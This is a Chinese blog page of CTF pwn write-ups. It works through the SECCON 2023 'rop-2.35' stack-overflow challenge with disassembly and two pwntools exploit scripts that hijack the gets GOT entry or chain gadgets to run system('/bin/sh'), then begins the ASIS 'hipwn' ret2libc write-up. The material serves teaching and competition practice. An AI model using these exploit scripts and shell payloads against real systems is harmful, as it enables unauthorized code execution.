<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="最近比赛中遇到的题">
<meta property="og:type" content="article">
<meta property="og:title" content="赛题录">
<meta property="og:url" content="https://ixout.github.io/posts/26406/index.html">
<meta property="og:site_name" content="ixout&#39;s blog">
<meta property="og:description" content="最近比赛中遇到的题">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-09-23_225025.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-11-04_221859.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-11-04_222054.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-11-04_222115.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-11-04_221835.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-02_160515.png">
<meta property="article:published_time" content="2023-09-16T12:46:50.000Z">
<meta property="article:modified_time" content="2025-01-13T02:58:09.779Z">
<meta property="article:author" content="ixout">
<meta property="article:tag" content="学习记录">
<meta property="article:tag" content="题解">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-09-23_225025.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.png">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.png">
        
      
    
    <!-- title -->
    <title>赛题录</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ixout's blog" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/posts/1518/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/posts/33400/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://ixout.github.io/posts/26406/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://ixout.github.io/posts/26406/&text=赛题录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://ixout.github.io/posts/26406/&is_video=false&description=赛题录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=赛题录&body=Check out this article: https://ixout.github.io/posts/26406/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://ixout.github.io/posts/26406/&title=赛题录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://ixout.github.io/posts/26406/&name=赛题录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://ixout.github.io/posts/26406/&t=赛题录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023seccon-rop-2-35"><span class="toc-number">1.</span> <span class="toc-text">2023seccon-rop-2.35</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E9%A2%98%E8%A7%A3"><span class="toc-number">1.1.</span> <span class="toc-text">其它题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ASIS2023-hipwn"><span class="toc-number">2.</span> <span class="toc-text">ASIS2023-hipwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B8%A9%E7%9A%84%E5%9D%91"><span class="toc-number">2.1.</span> <span class="toc-text">踩的坑</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E9%B9%8F%E5%9F%8E%E6%9D%AF-silent"><span class="toc-number">3.</span> <span class="toc-text">2023鹏城杯-silent</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A31"><span class="toc-number">3.0.1.</span> <span class="toc-text">解1:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A32"><span class="toc-number">3.0.2.</span> <span class="toc-text">解2:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-noob-heap"><span class="toc-number">4.</span> <span class="toc-text">2023第六届强网拟态- noob_heap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Etcache%E5%92%8Cfast%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84heap-leak"><span class="toc-number">4.1.</span> <span class="toc-text">关于tcache和fast加密后的heap leak</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023hitctf-scanf"><span class="toc-number">5.</span> <span class="toc-text">2023hitctf-scanf</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023tpctf-safehttpd"><span class="toc-number">6.</span> <span class="toc-text">2023tpctf-safehttpd</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2023-25139"><span class="toc-number">6.1.</span> <span class="toc-text">CVE-2023-25139</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rand"><span class="toc-number">6.2.</span> <span class="toc-text">rand</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023tctf-c00ledit"><span class="toc-number">7.</span> <span class="toc-text">2023tctf-c00ledit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023tctf-%E6%97%A0%E4%B8%AD%E7%94%9F%E6%9C%89"><span class="toc-number">8.</span> <span class="toc-text">2023tctf-无中生有</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A31-1"><span class="toc-number">8.1.</span> <span class="toc-text">解1:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A32-1"><span class="toc-number">8.2.</span> <span class="toc-text">解2:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#seccomp-tools%E6%A3%80%E6%B5%8B%E5%B8%A6%E5%8F%82%E6%95%B0elf"><span class="toc-number">8.3.</span> <span class="toc-text">seccomp-tools检测带参数elf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E5%BC%BA%E7%BD%91%E6%9D%AF-ez-fmt"><span class="toc-number">9.</span> <span class="toc-text">2023强网杯-ez_fmt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E5%BC%BA%E7%BD%91%E6%9D%AF-warmup23"><span class="toc-number">10.</span> <span class="toc-text">2023强网杯-warmup23</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#flat%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="toc-number">10.1.</span> <span class="toc-text">flat的使用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E5%AE%89%E6%B4%B5%E6%9D%AF-side-channel"><span class="toc-number">11.</span> <span class="toc-text">2023安洵杯-side-channel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2023%E5%AE%89%E6%B4%B5%E6%9D%AF-seccomp"><span class="toc-number">12.</span> <span class="toc-text">2023安洵杯-seccomp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024MAPNA-buggy-paint"><span class="toc-number">13.</span> <span class="toc-text">2024MAPNA-buggy_paint</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024%E9%95%BF%E5%9F%8E%E6%9D%AF-shutup"><span class="toc-number">14.</span> <span class="toc-text">2024长城杯-shutup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024%E9%95%BF%E5%9F%8E%E6%9D%AF-sometime"><span class="toc-number">15.</span> <span class="toc-text">2024长城杯-sometime</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024d3ctf-write-where-flag"><span class="toc-number">16.</span> <span class="toc-text">2024d3ctf-write_where_flag</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#solution1"><span class="toc-number">16.1.</span> <span class="toc-text">solution1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solution2"><span class="toc-number">16.2.</span> <span class="toc-text">solution2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#solution3"><span class="toc-number">16.3.</span> <span class="toc-text">solution3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024d3ctf-d3note"><span class="toc-number">17.</span> <span class="toc-text">2024d3ctf-d3note</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024ciscn-gostack"><span class="toc-number">18.</span> <span class="toc-text">2024ciscn-gostack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024ciscn-orange-cat-diary"><span class="toc-number">19.</span> <span class="toc-text">2024ciscn-orange_cat_diary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2024ciscn-ezheap"><span class="toc-number">20.</span> <span class="toc-text">2024ciscn-ezheap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2025SUCTF-Text"><span class="toc-number">21.</span> <span class="toc-text">2025SUCTF-Text</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2025SUCTF-BABY"><span class="toc-number">22.</span> <span class="toc-text">2025SUCTF-BABY</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        赛题录
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">ixout</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-09-16T12:46:50.000Z" class="dt-published" itemprop="datePublished">2023-09-16</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E9%A2%98%E8%A7%A3/">题解</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/wp/" rel="tag">wp</a>, <a class="p-category" href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" rel="tag">学习记录</a>, <a class="p-category" href="/tags/%E9%A2%98%E8%A7%A3/" rel="tag">题解</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="2023seccon-rop-2-35"><a href="#2023seccon-rop-2-35" class="headerlink" title="2023seccon-rop-2.35"></a>2023seccon-rop-2.35</h1><p><strong>标签:栈溢出|栈迁移|got劫持|rop</strong></p>
<p><strong>题目介绍:</strong>The number of ROP gadgets is declining worldwide.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;echo Enter something:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> gets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序就两行代码</p>
<p>汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000401156                               public main</span><br><span class="line">.text:0000000000401156                               main proc near                          ; DATA XREF: _start+18↑o</span><br><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               var_10= byte ptr -10h</span><br><span class="line">.text:0000000000401156</span><br><span class="line">.text:0000000000401156                               ; __unwind &#123;</span><br><span class="line">.text:0000000000401156 F3 0F 1E FA                   endbr64</span><br><span class="line">.text:000000000040115A 55                            push    rbp</span><br><span class="line">.text:000000000040115B 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:000000000040115E 48 83 EC 10                   sub     rsp, 10h</span><br><span class="line">.text:0000000000401162 48 8D 05 9B 0E 00 00          lea     rax, command                    ; &quot;echo Enter something:&quot;</span><br><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br><span class="line">.text:000000000040117D</span><br><span class="line">.text:0000000000401182 90                            nop</span><br><span class="line">.text:0000000000401183 C9                            leave</span><br><span class="line">.text:0000000000401184 C3                            retn</span><br><span class="line">.text:0000000000401184                               ; &#125; // starts at 401156</span><br><span class="line">.text:0000000000401184</span><br><span class="line">.text:0000000000401184                               main endp</span><br><span class="line">.text:0000000000401184</span><br><span class="line">.text:0000000000401184                               _text ends</span><br><span class="line">.text:0000000000401184</span><br></pre></td></tr></table></figure>
<p>checksec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure>
<p>保护基本不用考虑</p>
<p>常规思路自然是泄露libc等</p>
<p>不过这题程序没有单独使用过输出函数</p>
<p>唯一一次输出使用system实现的</p>
<p>因此根本无法做到泄露</p>
<hr>
<p>第一次错误想法:</p>
<p>如下,可以发现gets的参数是由rbp确定的(rbp-0x10)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br></pre></td></tr></table></figure>
<p>那么修改rbp就可以做到任意写了</p>
<p>看到以下这段代码,升起了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401162 48 8D 05 9B 0E 00 00          lea     rax, command                    ; &quot;echo Enter something:&quot;</span><br><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br></pre></td></tr></table></figure>
<p>修改command处字符串为/bin/sh</p>
<p>之后再rop到代码中执行system处</p>
<p>并在此之前做栈迁移,防止system栈越界</p>
<p>不过这个想法直接胎死腹中了</p>
<p>因为command所在段根本没有写权限</p>
<hr>
<p>第二个思路:</p>
<p>同样是利用gets参数由rbp确定的</p>
<p>可以看到gets参数可控,system参数不可控</p>
<p>但如果把<strong>gets函数劫持为system</strong></p>
<p>那就可以<strong>执行可控参数的system函数</strong>了</p>
<p>具体实施:</p>
<p>首先栈溢出让程序再次执行以一次gets(返回时leave已经修改rbp为可写gets的got表处)</p>
<p>这样在第二次gets的时候修改gets的got表为</p>
<p>system@plt+binsh字符串+目标rbp+lr+填充padding+binsh地址+0x10+0x401171</p>
<p>为了让system栈不越界还得再次栈迁移将栈往高处迁移</p>
<p>并将rbp控制位为-0x10刚好为binsh字符串</p>
<p>这样返回执行以下代码时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401171 48 8D 45 F0                   lea     rax, [rbp+var_10]</span><br><span class="line">.text:0000000000401175 48 89 C7                      mov     rdi, rax</span><br><span class="line">.text:0000000000401178 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:000000000040117D E8 DE FE FF FF                call    _gets</span><br></pre></td></tr></table></figure>
<p>实际上执行的就是system(‘/bin/sh’)</p>
<p><strong>exp:</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;rop-2-35.seccon.games&#x27;,9999)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b system&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">rbp1=<span class="number">0x404030</span></span><br><span class="line">pr=<span class="number">0x40113d</span></span><br><span class="line">gets=<span class="number">0x401171</span></span><br><span class="line">lr=<span class="number">0x401183</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+p64(rbp1)+p64(gets))</span><br><span class="line">p.sendline(p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x404800</span>)+p64(lr)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7c0</span>+p64(<span class="number">0x404038</span>)+p64(gets))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="其它题解"><a href="#其它题解" class="headerlink" title="其它题解"></a>其它题解</h2><p>赛后发现这个题解更简单暴力</p>
<p>利用了main函数在返回时rdi是一个可写的地址(这就要去观察了,光理论分析要分析出有点难度)</p>
<p>于是在返回时直接调用gets@plt</p>
<p>然后又利用gets的返回值就是指向输入字符串的指针</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401169 48 89 C7                      mov     rdi, rax                        ; command</span><br><span class="line">.text:000000000040116C E8 DF FE FF FF                call    _system</span><br><span class="line">.text:000000000040116C</span><br></pre></td></tr></table></figure>
<p>再加上面的gadget</p>
<p>就可以直接利用了</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">p, u = pack, unpack</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;rop-2-35.seccon.games&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x401060</span></span><br><span class="line">ret = <span class="number">0x401110</span></span><br><span class="line">mov_rdi_rax_call_system = <span class="number">0x401169</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">payload += p64(gets)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(mov_rdi_rax_call_system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">&#x27;//////////////////bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive(prompt=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>至于为什么要这么多<code>/</code>,不是很清楚但能观察到输入的字符串前面的某一个字符会变成其<code>ascii-1</code>对应的字符,例如<code>/</code>变为<code>.</code>,如果直接填<code>/bin/sh\x00</code>会变为<code>/bim/sh\x00</code></p>
<h1 id="ASIS2023-hipwn"><a href="#ASIS2023-hipwn" class="headerlink" title="ASIS2023-hipwn"></a>ASIS2023-hipwn</h1><p><strong>标签:栈溢出|ret2libc|rop</strong></p>
<p><strong>题目介绍:</strong>can you pwn??</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> nbytes[<span class="number">72</span>]; <span class="comment">// [rsp+Ch] [rbp-54h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How much???&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, nbytes);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;ok... now send content&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, &amp;nbytes[<span class="number">4</span>], *(<span class="type">unsigned</span> <span class="type">int</span> *)nbytes);</span><br><span class="line">    nbytes[*(<span class="type">unsigned</span> <span class="type">int</span> *)nbytes + <span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;nbytes[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wanna do it again?&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, nbytes);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)nbytes != <span class="number">0x539</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;i knew it&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>checksec,保护全开</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/chall&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>很常规的一道<strong>ret2libc</strong>题,但踩了不少坑</p>
<p>实现如下:</p>
<ol>
<li>泄露canary</li>
<li>泄露程序加载基址</li>
<li>泄露libc</li>
<li>rop</li>
</ol>
<p>观察一下栈</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2023-09-23_225025.png" alt=""></p>
<p>利用main泄露程序加载基址</p>
<p>利用libc_start_main泄露libc</p>
<p>常规处理,没有什么特殊的</p>
<p>最后所有流程都完成但运行无法正常getshell,猜测是栈不对齐,加一个ret即可</p>
<p><strong>exp:</strong>只适配了远程,但大致是这么个流程</p>
